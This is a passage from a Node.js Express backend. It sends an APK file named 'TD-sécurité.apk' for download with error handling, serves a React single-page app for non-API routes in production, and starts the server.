  res.download(apkPath, 'TD-sécurité.apk', (err) => {
    if (err) {
      console.error('[Download] Error sending TD-sécurité.apk:', err.message);
      if (!res.headersSent) {
        res.status(404).json({ success: false, error: 'App file not found. Please try again later.' });
      }
    }
  });
});


// Catch-all: serve React app for any non-API route (production only)
if (isProduction) {
  const clientDist = path.join(__dirname, '..', 'client', 'dist');
  app.get('*', (req, res) => {
    res.sendFile(path.join(clientDist, 'index.html'));
  });
}

app.listen(PORT, () => {
  console.log(`Backend server is running on http://localhost:${PORT}`);
});
